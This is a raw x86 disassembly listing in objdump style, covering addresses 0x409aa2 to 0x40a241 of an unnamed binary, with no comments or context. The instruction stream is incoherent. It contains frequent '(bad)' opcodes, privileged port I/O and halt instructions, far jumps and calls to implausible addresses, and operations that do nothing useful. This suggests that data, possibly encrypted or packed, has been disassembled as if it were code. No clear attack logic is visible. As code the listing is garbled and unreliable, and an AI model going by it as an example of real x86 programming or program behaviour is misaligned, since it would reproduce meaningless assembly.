  409aa2:	and    BYTE PTR [esi],bh
  409aa4:	cmp    eax,0x4639a175
  409aa9:	(bad)
  409aad:	or     DWORD PTR [esi-0x3c06ec22],esi
  409ab3:	dec    esi
  409ab4:	pop    ds
  409ab5:	cmp    al,0xc3
  409ab7:	xchg   ebp,eax
  409ab8:	add    eax,0x4bdbd4aa
  409abd:	push   0x22
  409abf:	aaa    
  409ac0:	xchg   ebx,eax
  409ac1:	push   0xffffff83
  409ac3:	mov    eax,0x481535fc
  409ac8:	mov    al,0xb5
  409aca:	xor    DWORD PTR [edx+0x2],esi
  409acd:	jbe    0x409b0d
  409acf:	cmp    DWORD PTR [ebp-0x1bd54538],0x5d977a58
  409ad9:	adc    cl,BYTE PTR [esi+0x182ac4ec]
  409adf:	add    ebp,eax
  409ae1:	out    dx,al
  409ae2:	pop    ecx
  409ae3:	fcom   st(7)
  409ae5:	jecxz  0x409a98
  409ae7:	loope  0x409b3e
  409ae9:	push   ds
  409aea:	or     DWORD PTR [ecx],0xffffffd8
  409aed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409aee:	test   BYTE PTR [ebx-0x7f9c8b71],0x6d
  409af5:	mov    bh,0xd0
  409af7:	adc    esi,ebx
  409af9:	sub    al,0x85
  409afb:	inc    esi
  409afc:	sar    DWORD PTR [esi+0x5d9bf47c],cl
  409b02:	or     al,0x8d
  409b04:	xchg   BYTE PTR [ebp-0x6f],dh
  409b07:	xchg   ecx,eax
  409b08:	add    eax,ebp
  409b0a:	fdivr  QWORD PTR [edx+0x356e7ce0]
  409b10:	jb     0x409ae5
  409b12:	call   0x2ea796dc
  409b17:	pop    edi
  409b18:	test   DWORD PTR [esi],eax
  409b1a:	push   cs
  409b1b:	jmp    0x422b:0xa817f780
  409b22:	sub    ebp,esi
  409b24:	sbb    ah,al
  409b26:	and    esi,DWORD PTR [edi+0x1f1d9b54]
  409b2c:	pushf  
  409b2d:	push   ebp
  409b2e:	in     eax,dx
  409b2f:	leave  
  409b30:	mov    ds:0xda76c75a,al
  409b35:	xchg   edi,eax
  409b36:	push   0x26
  409b38:	popa   
  409b39:	(bad)  
  409b3a:	pop    ecx
  409b3b:	les    edx,FWORD PTR [ebp-0x54]
  409b3e:	loop   0x409b85
  409b40:	push   cs
  409b41:	stos   BYTE PTR es:[edi],al
  409b42:	icebp  
  409b43:	in     al,dx
  409b44:	adc    al,0x92
  409b46:	inc    ebp
  409b47:	icebp  
  409b48:	push   eax
  409b49:	loop   0x409b23
  409b4b:	test   eax,0xaed6255d
  409b50:	in     al,dx
  409b51:	pop    esi
  409b52:	mov    cl,0xda
  409b54:	push   edx
  409b55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b56:	popa   
  409b57:	popf   
  409b58:	xchg   ebp,eax
  409b59:	mov    al,ds:0xa7c2c277
  409b5e:	jmp    0x6f190ff0
  409b63:	dec    ebp
  409b64:	pop    ebp
  409b65:	jmp    0x409bbf
  409b67:	pusha  
  409b68:	iret   
  409b69:	loopne 0x409bb7
  409b6b:	(bad)  
  409b6c:	fmul   QWORD PTR [esi+0x469558e9]
  409b72:	adc    edx,DWORD PTR [eax+0x67]
  409b75:	pusha  
  409b76:	retf   0x3c0b
  409b79:	mov    eax,ds:0x2a51804a
  409b7e:	dec    DWORD PTR [edi+0x74de23b7]
  409b84:	jae    0x409b92
  409b86:	fisubr DWORD PTR [eax+0x7c2e8bb2]
  409b8c:	out    0x80,eax
  409b8e:	vunpckhps xmm0,xmm4,xmm1
  409b92:	imul   edx,DWORD PTR [ebx+0x4c],0xffffffd9
  409b96:	test   al,0xc0
  409b98:	clc    
  409b99:	cmp    DWORD PTR [edi],ebp
  409b9b:	dec    ecx
  409b9c:	mov    esi,0x6bc72f17
  409ba1:	and    eax,0x1c6d7bb1
  409ba6:	adc    eax,0x4f1ae059
  409bab:	loop   0x409b5c
  409bad:	inc    eax
  409bae:	pop    ss
  409baf:	and    BYTE PTR [ebx+eax*4+0x32daad5e],ch
  409bb6:	lahf   
  409bb7:	jge    0x409bde
  409bb9:	leave  
  409bba:	fwait
  409bbb:	out    0x39,al
  409bbd:	aaa    
  409bbe:	adc    al,0x30
  409bc0:	ror    BYTE PTR [edx+0x6e],0x27
  409bc4:	inc    esi
  409bc5:	push   ecx
  409bc6:	pop    esp
  409bc7:	mul    DWORD PTR [eax-0x20]
  409bca:	and    BYTE PTR [edx+0x297494ad],ch
  409bd0:	(bad)  
  409bd2:	int3   
  409bd3:	fsub   st,st(2)
  409bd5:	jae    0x409c31
  409bd7:	push   ecx
  409bd8:	cmp    ch,BYTE PTR [esi+0xd]
  409bdb:	ins    DWORD PTR es:[edi],dx
  409bdc:	in     eax,0x34
  409bde:	dec    esp
  409bdf:	push   ebx
  409be0:	push   edx
  409be1:	xchg   ebp,eax
  409be2:	and    dh,BYTE PTR [ebx-0x2f4dadd9]
  409be8:	xchg   BYTE PTR [eax+0x67cc6609],dh
  409bee:	(bad)  
  409bef:	and    cl,dl
  409bf1:	in     eax,dx
  409bf2:	in     eax,0x8
  409bf4:	(bad)  
  409bf5:	xor    ah,cl
  409bf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bf8:	jp     0x409bbc
  409bfa:	outs   dx,BYTE PTR ds:[esi]
  409bfb:	xor    al,0x2
  409bfd:	cmp    ah,0x1d
  409c00:	lods   eax,DWORD PTR ds:[esi]
  409c01:	fsubr  st,st(4)
  409c03:	or     al,0xba
  409c05:	pop    ss
  409c06:	ret    0x8e4d
  409c09:	jo     0x409b92
  409c0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c0c:	fwait
  409c0d:	outs   dx,DWORD PTR ds:[esi]
  409c0e:	xor    bl,dh
  409c10:	or     BYTE PTR [esi-0x6106837d],cl
  409c16:	inc    edi
  409c17:	and    ebp,DWORD PTR [eax+0x1b1f4d2]
  409c1d:	div    ah
  409c1f:	fidivr WORD PTR [esi-0x70]
  409c22:	test   BYTE PTR [edi],cl
  409c24:	mov    ecx,0x735537d6
  409c29:	and    eax,0xb59f4d21
  409c2e:	out    0x14,eax
  409c30:	jge    0x409ca1
  409c32:	fwait
  409c33:	xor    DWORD PTR [ebx-0x3a],edx
  409c36:	sbb    al,0x29
  409c38:	xor    ebp,DWORD PTR [ebx-0x17576268]
  409c3e:	ret    
  409c3f:	and    DWORD PTR [edi-0x2e],esi
  409c42:	push   edx
  409c43:	cmp    ebx,DWORD PTR [ebx-0x681f90fe]
  409c49:	pop    esi
  409c4a:	pop    edx
  409c4b:	push   cs
  409c4c:	xor    DWORD PTR [ebp-0x4a7ae55a],ecx
  409c52:	push   edi
  409c53:	leave  
  409c54:	dec    edi
  409c55:	add    edi,DWORD PTR [ecx-0x5e71e81a]
  409c5b:	js     0x409c37
  409c5d:	hlt    
  409c5e:	rol    bh,cl
  409c60:	adc    eax,0xab6649e5
  409c65:	dec    edi
  409c66:	cmp    ecx,0x1f
  409c69:	ror    DWORD PTR [ecx+0x61bc897c],1
  409c6f:	ds stc 
  409c71:	sub    al,0x67
  409c73:	loopne 0x409c60
  409c75:	mov    ah,0xff
  409c77:	jmp    0x8138b90e
  409c7c:	fnsave [edi-0x4d]
  409c7f:	clc    
  409c80:	pop    edi
  409c81:	outs   dx,BYTE PTR ds:[esi]
  409c82:	icebp  
  409c83:	ffree  st(1)
  409c85:	mov    edx,0xcf9e4a0
  409c8a:	repz pop esi
  409c8c:	push   ebp
  409c8d:	sahf   
  409c8e:	les    ebp,FWORD PTR [edx]
  409c90:	jmp    0x9aa9c2dd
  409c95:	add    BYTE PTR [esi-0x51],cl
  409c98:	stos   DWORD PTR es:[edi],eax
  409c99:	ret    0xd46f
  409c9c:	repz add DWORD PTR [edi-0x18],edx
  409ca0:	or     DWORD PTR [ebp-0x5],ebx
  409ca3:	popf   
  409ca4:	dec    esi
  409ca5:	mov    cs,WORD PTR [ebp+0x7567cf0b]
  409cab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cac:	mov    bl,0xc3
  409cae:	fldcw  WORD PTR [ecx-0x1]
  409cb1:	int    0x71
  409cb3:	test   al,0x20
  409cb5:	pop    ds
  409cb6:	pop    esp
  409cb7:	ins    DWORD PTR es:[edi],dx
  409cb8:	in     al,dx
  409cb9:	test   DWORD PTR ds:[ecx],ecx
  409cbc:	rcr    DWORD PTR [ecx-0x3],0xef
  409cc0:	adc    esi,DWORD PTR [edx-0x74ff00a3]
  409cc6:	sub    esi,DWORD PTR [ebx+0x2db4be8e]
  409ccc:	adc    DWORD PTR [eax-0x619891ce],eax
  409cd2:	pop    edi
  409cd3:	or     eax,0x4dc68762
  409cd8:	add    ah,BYTE PTR [ecx+0xd1593b8]
  409cde:	int3   
  409cdf:	mov    bl,0x9b
  409ce1:	retf   0x8d57
  409ce4:	les    ecx,FWORD PTR [edx+0x58c90eea]
  409cea:	cld    
  409ceb:	stc    
  409cec:	add    ah,0x83
  409cef:	stos   BYTE PTR es:[edi],al
  409cf0:	repnz add eax,0x32f4f04b
  409cf6:	cmp    eax,0x850c117d
  409cfb:	mov    ebp,0x324cb1db
  409d00:	fsub   QWORD PTR [esi+0x5ceb393f]
  409d06:	pop    ss
  409d07:	stos   DWORD PTR es:[edi],eax
  409d08:	int3   
  409d09:	imul   ebx,DWORD PTR [ecx+0x3b],0x35313d1d
  409d10:	neg    BYTE PTR [ebx]
  409d12:	lahf   
  409d13:	(bad)  [ebp-0x7754a44c]
  409d19:	xor    al,0xf6
  409d1b:	out    dx,al
  409d1c:	clc    
  409d1d:	xchg   esp,eax
  409d1e:	imul   ecx,DWORD PTR [ebp-0x1aa80f84],0x72
  409d25:	mov    WORD PTR [ebx-0x18],ds
  409d28:	push   0x32
  409d2a:	lahf   
  409d2b:	int    0x5e
  409d2d:	mov    bh,0x29
  409d2f:	xor    cl,BYTE PTR [edx+eiz*1-0x70]
  409d33:	retf   0xfb83
  409d36:	jno    0x409db7
  409d38:	sti    
  409d39:	daa    
  409d3a:	jmp    0x409d74
  409d3c:	test   dh,ah
  409d3e:	inc    edi
  409d3f:	mov    ebx,0xa778db23
  409d44:	adc    al,0xa1
  409d46:	scas   eax,DWORD PTR es:[edi]
  409d47:	aaa    
  409d48:	mov    esi,0xa2897c8d
  409d4d:	shl    DWORD PTR [eax-0x2ee70ce],1
  409d53:	hlt    
  409d54:	jmp    DWORD PTR [edx]
  409d56:	push   ecx
  409d57:	or     al,0xa9
  409d59:	jmp    0x3067346
  409d5e:	shl    ebx,0x2c
  409d61:	or     eax,0xf877eaa1
  409d66:	dec    esp
  409d67:	loope  0x409cf0
  409d69:	xchg   esi,eax
  409d6a:	add    esp,DWORD PTR [edi-0x48]
  409d6d:	test   BYTE PTR [ecx-0x4a],al
  409d70:	dec    esi
  409d71:	and    al,0xa9
  409d73:	xor    eax,0xe537d8e8
  409d78:	aas    
  409d79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d7a:	rcl    DWORD PTR [edi+0x6],cl
  409d7d:	iret   
  409d7e:	pop    edx
  409d7f:	leave  
  409d80:	stc    
  409d81:	and    dl,dh
  409d83:	fwait
  409d84:	cli    
  409d85:	pop    esp
  409d86:	hlt    
  409d87:	popa   
  409d88:	stc    
  409d89:	pop    ds
  409d8a:	sbb    eax,0xa1ac077b
  409d8f:	cwde   
  409d90:	dec    esi
  409d91:	dec    esi
  409d92:	sbb    DWORD PTR [esp+ebx*4+0x2241a9c5],0xdaeb562c
  409d9d:	xchg   edi,eax
  409d9e:	shl    BYTE PTR [ebx+0x31],cl
  409da1:	mov    ch,0xd6
  409da3:	call   0x7332:0x58de52aa
  409daa:	jl     0x409dab
  409dac:	mov    ds:0x108195b9,al
  409db1:	fimul  DWORD PTR [edi+0x75]
  409db4:	mov    bl,0x93
  409db6:	jnp    0x409da2
  409db8:	jg     0x409e0f
  409dba:	sub    bl,0x1e
  409dbd:	mul    DWORD PTR [edi-0x1e6def4a]
  409dc3:	xor    DWORD PTR [esi+edx*8-0x567a3232],edx
  409dca:	xchg   esp,eax
  409dcb:	dec    eax
  409dcc:	rcl    BYTE PTR [ecx-0x35ff9f7b],0xba
  409dd3:	pop    ecx
  409dd4:	data16 js 0x409da0
  409dd7:	cmp    eax,0x4913e469
  409ddc:	sbb    BYTE PTR [esi-0x601ae353],dh
  409de2:	pop    ebx
  409de3:	daa    
  409de4:	aad    0x41
  409de6:	mov    ebx,?
  409de8:	cmc    
  409de9:	inc    edx
  409dea:	sti    
  409deb:	adc    eax,0x9af95008
  409df0:	xor    eax,DWORD PTR [ecx+ebp*2+0x5709741d]
  409df7:	mov    ds:0xcc17a973,eax
  409dfc:	cmp    cl,BYTE PTR [ebp-0x7a]
  409dff:	loopne 0x409ddb
  409e01:	call   0xd5f025ff
  409e06:	(bad)  
  409e07:	addr16 aaa 
  409e09:	scas   eax,DWORD PTR es:[edi]
  409e0a:	outs   dx,DWORD PTR ds:[esi]
  409e0b:	ror    DWORD PTR [edi],0xdb
  409e0e:	mov    dh,0x78
  409e10:	scas   al,BYTE PTR es:[edi]
  409e11:	xchg   edx,eax
  409e12:	adc    BYTE PTR [esi-0x21],dh
  409e15:	out    0xe2,eax
  409e17:	dec    eax
  409e18:	in     al,dx
  409e19:	pop    ecx
  409e1a:	add    cl,al
  409e1c:	popa   
  409e1d:	sar    DWORD PTR [edi],1
  409e1f:	adc    dl,BYTE PTR [ecx+edi*1+0x6b9d9d27]
  409e26:	arpl   cx,dx
  409e28:	inc    edx
  409e29:	push   0x2d
  409e2b:	mov    eax,ds:0x54e72998
  409e30:	mov    esi,0x4a21d878
  409e35:	(bad)  
  409e36:	in     al,0xa2
  409e38:	mov    ecx,0x7197b2f2
  409e3d:	or     DWORD PTR [ecx+ebp*1],edx
  409e40:	lahf   
  409e41:	ja     0x409eae
  409e43:	inc    eax
  409e44:	fcomp  DWORD PTR [ebx+0x697139a0]
  409e4a:	push   ss
  409e4b:	mov    dh,0xc6
  409e4d:	jl     0x409e11
  409e4f:	arpl   cx,sp
  409e51:	jmp    FWORD PTR [edi+edi*4-0x682f0123]
  409e58:	inc    ebx
  409e59:	sbb    al,0x4b
  409e5b:	(bad)  
  409e5c:	fiadd  DWORD PTR [edx]
  409e5e:	pop    eax
  409e5f:	loop   0x409e41
  409e61:	jp     0x409e07
  409e63:	cmp    eax,0xdbdb90f5
  409e68:	movhps xmm5,QWORD PTR [ebx+eax*2+0x5a27b4ff]
  409e70:	fld    st(5)
  409e72:	or     ebp,ebx
  409e74:	call   0xb87e:0x5e2b1c50
  409e7b:	jg     0x409e1f
  409e7d:	inc    esp
  409e7e:	or     dl,al
  409e80:	jns    0x409e90
  409e82:	mov    bh,BYTE PTR [edi]
  409e84:	outs   dx,BYTE PTR ds:[esi]
  409e85:	cmp    esp,DWORD PTR [ecx+ebp*8-0x49]
  409e89:	frstor [ebp-0x37]
  409e8c:	aam    0xa1
  409e8e:	aaa    
  409e8f:	or     ebp,ebp
  409e91:	in     al,0xde
  409e93:	cmp    ch,BYTE PTR [eax]
  409e95:	xchg   esp,eax
  409e96:	icebp  
  409e97:	ror    BYTE PTR [eax-0x64],1
  409e9a:	dec    ecx
  409e9b:	xchg   ebp,eax
  409e9c:	xor    esp,eax
  409e9e:	arpl   sp,di
  409ea0:	pop    edx
  409ea1:	cld    
  409ea2:	jbe    0x409e86
  409ea4:	or     ebx,DWORD PTR [ecx+0x49]
  409ea7:	sahf   
  409ea8:	xchg   edx,eax
  409ea9:	scas   al,BYTE PTR es:[edi]
  409eaa:	jnp    0x409e52
  409eac:	mov    BYTE PTR [eax-0x378223a1],bh
  409eb2:	pop    cx
  409eb4:	xchg   esi,eax
  409eb5:	sub    DWORD PTR [ebp-0x57b0f72e],esp
  409ebb:	pop    es
  409ebc:	fist   DWORD PTR [eax]
  409ebe:	(bad)
  409ec2:	inc    edi
  409ec3:	jmp    0x333bbda8
  409ec8:	in     al,0xde
  409eca:	xor    DWORD PTR [eax-0x2f],ecx
  409ecd:	daa    
  409ece:	xlat   BYTE PTR ds:[ebx]
  409ecf:	rol    DWORD PTR [bp-0x6],1
  409ed3:	es js  0x409f41
  409ed6:	pushf  
  409ed7:	shl    DWORD PTR [eax-0x10a7af35],cl
  409edd:	imul   DWORD PTR [edx+0x2f3dcad7]
  409ee3:	xchg   edx,eax
  409ee4:	in     al,dx
  409ee5:	sbb    DWORD PTR [ecx+0x46b0140d],esi
  409eeb:	sub    DWORD PTR [edx+0x2b238a71],ecx
  409ef1:	clc    
  409ef2:	ins    DWORD PTR es:[edi],dx
  409ef3:	pushf  
  409ef4:	ins    DWORD PTR es:[edi],dx
  409ef5:	fdivr  DWORD PTR [esp+ebx*1+0x6d]
  409ef9:	push   0x6f8f7e30
  409efe:	cwde   
  409eff:	xor    edi,DWORD PTR [edi+0x357c5981]
  409f05:	jbe    0x409ec2
  409f07:	mov    ebp,0x4405c29c
  409f0c:	inc    ebp
  409f0d:	dec    ebx
  409f0e:	scas   eax,DWORD PTR es:[edi]
  409f0f:	test   al,0x72
  409f11:	icebp  
  409f12:	and    eax,0xe4a65d65
  409f17:	daa    
  409f18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f19:	add    dh,dl
  409f1b:	push   esi
  409f1c:	sbb    ebp,DWORD PTR [ebp-0x4a]
  409f1f:	dec    esp
  409f20:	repnz bound esi,QWORD PTR [esi+0xa2f2e71]
  409f27:	ds pop ebx
  409f29:	test   DWORD PTR ds:0x77b9b3db,edi
  409f2f:	push   bx
  409f31:	fwait
  409f32:	and    BYTE PTR [edi],al
  409f34:	push   ebp
  409f35:	mov    ah,0x8f
  409f37:	scas   eax,DWORD PTR es:[edi]
  409f38:	lock cmp dl,bh
  409f3b:	gs fucomp st(4)
  409f3e:	popa   
  409f3f:	sub    edx,edx
  409f41:	iret   
  409f42:	xchg   ecx,eax
  409f43:	jb     0x409f9c
  409f45:	or     cl,BYTE PTR [ecx]
  409f47:	xor    eax,0x2d2ecebc
  409f4c:	cmc    
  409f4d:	(bad)  
  409f4e:	cwde   
  409f4f:	inc    ebp
  409f50:	pop    edi
  409f51:	pop    ecx
  409f52:	cvttps2pi mm4,QWORD PTR [ebx-0x1c]
  409f56:	mov    ecx,DWORD PTR [esp+ebx*8]
  409f59:	mov    ebp,0xd2a2c9e1
  409f5e:	in     eax,0x3d
  409f60:	in     eax,dx
  409f61:	mov    cl,0x96
  409f63:	std    
  409f64:	aam    0x72
  409f66:	addr16 aad 0xb3
  409f69:	ins    DWORD PTR es:[edi],dx
  409f6a:	out    dx,al
  409f6b:	daa    
  409f6c:	stos   DWORD PTR es:[edi],eax
  409f6d:	outs   dx,BYTE PTR ds:[esi]
  409f6e:	fadd   st(0),st
  409f70:	adc    ebx,ebp
  409f72:	outs   dx,DWORD PTR ds:[esi]
  409f73:	push   ebp
  409f74:	mov    BYTE PTR [edx],dl
  409f76:	int    0x24
  409f78:	stos   BYTE PTR es:[edi],al
  409f79:	arpl   WORD PTR [ebx+0x4fa10b16],sp
  409f7f:	fisubr WORD PTR [ebp+0x25]
  409f82:	pushf  
  409f83:	xchg   ecx,eax
  409f84:	push   ebp
  409f85:	(bad)  
  409f86:	fwait
  409f87:	std    
  409f88:	sahf   
  409f89:	icebp  
  409f8a:	mov    cl,0x14
  409f8c:	shl    DWORD PTR [esi],0x83
  409f8f:	out    dx,eax
  409f90:	aas    
  409f91:	(bad)  [esi-0x3ba799a0]
  409f97:	xchg   esi,eax
  409f98:	call   0xea5ca640
  409f9d:	xor    DWORD PTR [eax],0xffffffbb
  409fa0:	sti    
  409fa1:	push   ecx
  409fa2:	push   ebp
  409fa3:	sub    DWORD PTR [edi-0x3432ecce],0xe
  409faa:	addr16 xchg bp,ax
  409fad:	div    BYTE PTR fs:[esi]
  409fb0:	mov    ds:0x293197f4,eax
  409fb5:	test   eax,0x2bf457c6
  409fba:	mov    bl,0xb
  409fbc:	test   eax,0xb632d7aa
  409fc1:	jmp    0x409fa0
  409fc3:	inc    ebp
  409fc4:	pop    ds
  409fc5:	sbb    DWORD PTR [edx-0x18812c1d],eax
  409fcb:	cmp    edx,DWORD PTR [edi+0x27]
  409fce:	or     ebx,ecx
  409fd0:	ss xchg ecx,eax
  409fd2:	mov    ch,BYTE PTR [esi-0x7d]
  409fd5:	xchg   ecx,eax
  409fd6:	fisub  WORD PTR [eax+0x1a58e486]
  409fdc:	bound  ecx,QWORD PTR [edx+0x2b3c6280]
  409fe2:	das    
  409fe3:	aam    0x24
  409fe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fe6:	pop    ss
  409fe7:	in     al,0x4a
  409fe9:	test   dl,bl
  409feb:	fstp   QWORD PTR [eax]
  409fed:	popf   
  409fee:	inc    esi
  409fef:	mov    ecx,0x153e8977
  409ff4:	adc    DWORD PTR [edx+0x6],ebp
  409ff7:	cli    
  409ff8:	mov    edx,0x334f4757
  409ffd:	pop    es
  409ffe:	mov    cl,0x18
  40a000:	scas   eax,DWORD PTR es:[edi]
  40a001:	std    
  40a002:	and    DWORD PTR ds:0x1a7974e7,ecx
  40a008:	pop    ds
  40a009:	and    al,0x3e
  40a00b:	inc    esp
  40a00c:	nop
  40a00d:	jmp    0xf922:0xc5e5382e
  40a014:	gs loopne 0x409f9f
  40a017:	mov    ds:0x2290e0b3,al
  40a01c:	inc    ecx
  40a01d:	mov    dh,0x2b
  40a01f:	inc    esp
  40a020:	jbe    0x409ff3
  40a022:	xchg   DWORD PTR [ebp+eiz*1-0x46],edx
  40a026:	int3   
  40a027:	fimul  WORD PTR ds:0x6b24dc41
  40a02d:	(bad)  [edx-0x7c6d48e0]
  40a033:	cmp    DWORD PTR [esi+0x4a],0x4317142a
  40a03a:	or     DWORD PTR [edx+0x2e],esp
  40a03d:	xchg   dl,dl
  40a03f:	jb     0x409fce
  40a041:	(bad)  
  40a042:	sti    
  40a043:	out    0x23,eax
  40a045:	jno    0x409ff0
  40a047:	mov    esi,0x7993c054
  40a04c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a04d:	xchg   ecx,eax
  40a04e:	lods   eax,DWORD PTR ds:[esi]
  40a04f:	mov    dh,0x98
  40a051:	jmp    0x40a045
  40a053:	fisttp DWORD PTR [ebp+0x32]
  40a056:	inc    esp
  40a057:	pop    edx
  40a058:	aaa    
  40a059:	add    eax,DWORD PTR [edi]
  40a05b:	jl     0x40a025
  40a05d:	call   0x2ca4988b
  40a062:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a063:	das    
  40a064:	push   ecx
  40a065:	stos   DWORD PTR es:[edi],eax
  40a066:	mov    esp,0x1cff045b
  40a06b:	xlat   BYTE PTR ds:[ebx]
  40a06c:	fs sahf 
  40a06e:	aas    
  40a06f:	(bad)  
  40a070:	cmp    eax,0x530cf1f5
  40a075:	cmc    
  40a076:	je     0x40a069
  40a078:	pop    edx
  40a079:	das    
  40a07a:	ds (bad) 
  40a07d:	sti    
  40a07e:	ins    BYTE PTR es:[edi],dx
  40a07f:	fcmove st,st(7)
  40a081:	test   DWORD PTR [eax+0x69d0968b],0xd4b30076
  40a08b:	iret   
  40a08c:	sbb    esi,DWORD PTR [ecx]
  40a08e:	push   ss
  40a08f:	hlt    
  40a090:	mov    dh,0xc7
  40a093:	push   esi
  40a094:	iret   
  40a095:	mov    dl,ch
  40a097:	cwde   
  40a098:	adc    ah,BYTE PTR [edi+0x61]
  40a09b:	mov    esp,0x3cb5ed45
  40a0a0:	repnz pop esp
  40a0a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0a3:	jbe    0x40a04e
  40a0a5:	aaa    
  40a0a6:	push   esi
  40a0a7:	ror    BYTE PTR [edx-0x57f54063],0x6a
  40a0ae:	jns    0x40a11c
  40a0b0:	inc    edx
  40a0b1:	or     al,0x71
  40a0b3:	sbb    al,0x2b
  40a0b5:	sub    esi,DWORD PTR [ebx-0x58]
  40a0b8:	mov    edx,0x364482d
  40a0bd:	mov    al,bh
  40a0bf:	arpl   WORD PTR [edi],si
  40a0c1:	pop    ss
  40a0c2:	jb     0x40a0e6
  40a0c4:	jle    0x40a0c9
  40a0c6:	or     dl,BYTE PTR [ecx-0x2922f44]
  40a0cc:	inc    ebx
  40a0cd:	adc    eax,0xda4f8be0
  40a0d2:	add    DWORD PTR [edx-0xc],esp
  40a0d5:	mov    ecx,0x4318ec1e
  40a0da:	push   0x5
  40a0dc:	push   edi
  40a0dd:	in     al,0xd7
  40a0df:	lds    ebp,FWORD PTR [edi+0x19]
  40a0e2:	jae    0x40a093
  40a0e4:	ja     0x40a13c
  40a0e6:	jp     0x40a15e
  40a0e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0e9:	rol    edi,1
  40a0eb:	push   es
  40a0ec:	xor    al,0x42
  40a0ee:	call   0x2e87650
  40a0f3:	pusha  
  40a0f4:	xchg   esp,eax
  40a0f5:	pop    ebp
  40a0f6:	dec    edx
  40a0f7:	sub    al,BYTE PTR [ebp-0x54990895]
  40a0fd:	xchg   ebp,eax
  40a0fe:	arpl   WORD PTR gs:[esi+0x4835ec0f],di
  40a105:	fadd   DWORD PTR [ebx+ebx*2-0xc]
  40a109:	push   ebx
  40a10a:	sbb    ecx,ecx
  40a10c:	(bad)  
  40a10e:	mov    ds:0xac2b2877,al
  40a113:	mov    ds:0xd49465d7,eax
  40a118:	repnz dec esp
  40a11a:	mov    BYTE PTR fs:[eax-0x3b],dh
  40a11e:	xchg   esp,eax
  40a11f:	lock and eax,DWORD PTR [eax]
  40a122:	out    dx,al
  40a123:	icebp  
  40a124:	xor    eax,0xd83db716
  40a129:	jne    0x40a0d0
  40a12b:	inc    ecx
  40a12c:	(bad)  
  40a12d:	ret    
  40a12e:	into   
  40a12f:	xor    DWORD PTR ds:0x35cd0e35,edx
  40a135:	test   BYTE PTR [ebx-0x5a089fee],dl
  40a13b:	xchg   ebx,eax
  40a13c:	inc    ebx
  40a13d:	dec    ebx
  40a13e:	sub    BYTE PTR [ebx-0x42],bh
  40a141:	(bad)  
  40a142:	fsubr  DWORD PTR [esi]
  40a144:	adc    BYTE PTR [ecx],dh
  40a146:	jno    0x40a11e
  40a148:	ret    
  40a149:	in     al,dx
  40a14a:	test   ch,cl
  40a14c:	imul   ebp,DWORD PTR [ebx],0xffffff8f
  40a14f:	push   edx
  40a150:	xchg   DWORD PTR [esi+0x3a],edi
  40a153:	mov    bl,0xf1
  40a155:	outs   dx,BYTE PTR ds:[esi]
  40a156:	shl    ecx,0xf3
  40a159:	mov    al,ds:0x1205bb7b
  40a15e:	and    al,0xca
  40a160:	or     BYTE PTR ds:0x27bd2e0a,0x7b
  40a167:	sbb    al,0xca
  40a169:	mov    ds:0x771349c6,al
  40a16e:	or     eax,0x8ddddae9
  40a173:	(bad)  
  40a174:	leave  
  40a175:	frstor [eax+0x6b]
  40a178:	mov    ebp,edi
  40a17a:	(bad)  
  40a17b:	add    ah,BYTE PTR [ecx]
  40a17d:	add    dl,BYTE PTR [eax-0x670f321a]
  40a183:	test   al,0xe1
  40a185:	inc    edx
  40a186:	jp     0x40a1be
  40a188:	mov    dl,0xb7
  40a18a:	mov    esi,0x99d7800c
  40a18f:	iret   
  40a190:	data16 mov bl,0xe2
  40a193:	cmp    DWORD PTR [esi+0x1a],eax
  40a196:	sub    DWORD PTR ds:[eax],ebp
  40a199:	test   al,0x46
  40a19b:	aas    
  40a19c:	aad    0xf5
  40a19e:	and    ch,bl
  40a1a0:	lods   al,BYTE PTR ds:[esi]
  40a1a1:	and    eax,0x260c374f
  40a1a6:	out    dx,al
  40a1a7:	sub    ah,0x20
  40a1aa:	je     0x40a14a
  40a1ac:	mov    esi,0x5903786
  40a1b1:	inc    edx
  40a1b2:	mov    eax,0xd8d0b829
  40a1b7:	gs xor eax,0x92980f18
  40a1bd:	mov    ecx,0xcf4a9b4
  40a1c2:	je     0x40a192
  40a1c4:	or     al,0x5c
  40a1c6:	adc    DWORD PTR [edx+esi*8],edx
  40a1c9:	fcomp  DWORD PTR [eax-0x50aa6545]
  40a1cf:	inc    ebx
  40a1d0:	adc    BYTE PTR [ecx-0x49],dh
  40a1d3:	and    BYTE PTR [ecx+0x47b116e8],dl
  40a1d9:	and    al,0xb2
  40a1db:	in     al,0xb2
  40a1dd:	push   esi
  40a1de:	fnsave [ebx+0x1df89705]
  40a1e4:	and    BYTE PTR [eax+0x28],ah
  40a1e7:	dec    esi
  40a1e8:	sub    eax,0xd4521df0
  40a1ed:	or     cl,0x11
  40a1f0:	mov    bl,0xfa
  40a1f2:	int3   
  40a1f3:	ret    
  40a1f4:	jmp    0x44f8:0x7b273926
  40a1fb:	mov    edi,DWORD PTR [ebp+0x7bf88843]
  40a201:	add    ecx,ebx
  40a203:	push   ebx
  40a204:	mov    ebx,0xeebccd5
  40a209:	dec    edi
  40a20a:	dec    ecx
  40a20b:	adc    DWORD PTR [ebp+0x7610cc03],edi
  40a211:	xor    dl,ch
  40a213:	in     al,0x81
  40a215:	jmp    DWORD PTR [ebx]
  40a217:	pop    ss
  40a218:	ret    
  40a219:	or     edi,ebp
  40a21b:	cli    
  40a21c:	das    
  40a21d:	in     al,dx
  40a21e:	je     0x40a1ee
  40a220:	xor    al,0x8b
  40a222:	push   esp
  40a223:	in     al,dx
  40a224:	adc    DWORD PTR [ebp+0x33],ecx
  40a227:	shr    DWORD PTR [esi+ebp*2+0x4cf9b43c],1
  40a22e:	call   0x8ae75227
  40a233:	pusha  
  40a234:	nop
  40a235:	aam    0xe1
  40a237:	int3   
  40a238:	mov    edx,0x21ad2553
  40a23d:	jae    0x40a1fa
  40a23f:	out    0x64,al
  40a241:	dec    ebx
